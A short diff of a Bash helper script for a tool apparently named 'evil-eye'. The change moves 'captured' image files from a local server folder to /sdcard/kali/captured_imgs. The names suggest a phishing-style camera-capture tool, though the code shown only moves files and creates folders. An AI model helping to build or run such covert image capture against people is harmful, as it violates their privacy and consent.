@@ -4,14 +4,15 @@
 EYE_PATH="$SCRIPT_DIR/.sites/evil-eye"
 
 # ─────────────────────────────────────────────────────────────────────────────
-# Move captured image files from .server/images → captured_imgs/
+# Move captured image files from .server/images → /sdcard/kali/captured_imgs/
 # ─────────────────────────────────────────────────────────────────────────────
 move_capture_file() {
     if [ -d "$SCRIPT_DIR/.server/images" ]; then
         shopt -s nullglob
         local files=("$SCRIPT_DIR/.server/images/"*)
-     if [[ ${#files[@]} -gt 0 ]]; then
-     mv "${files[@]}" "$sdcard/kali/captured_imgs/"
+        if [[ ${#files[@]} -gt 0 ]]; then
+            mkdir -p "/sdcard/kali/captured_imgs"
+            mv "${files[@]}" "/sdcard/kali/captured_imgs/"
         fi
         shopt -u nullglob
     fi
@@ -23,10 +24,8 @@ move_capture_file() {
 # evel.sh calls this AFTER load_lib() so SCRIPT_DIR is already set.
 # ─────────────────────────────────────────────────────────────────────────────
 init_setup() {
-    # Ensure captured_imgs folder exists
-    if [ ! -d "$SCRIPT_DIR/captured_imgs" ]; then
-        mkdir -p "$SCRIPT_DIR/captured_imgs"
-    fi
+    # Ensure captured_imgs folder exists on SD card
+    mkdir -p "/sdcard/kali/captured_imgs"
 
     # Ensure .server folder exists
     if [ ! -d "$SCRIPT_DIR/.server" ]; then
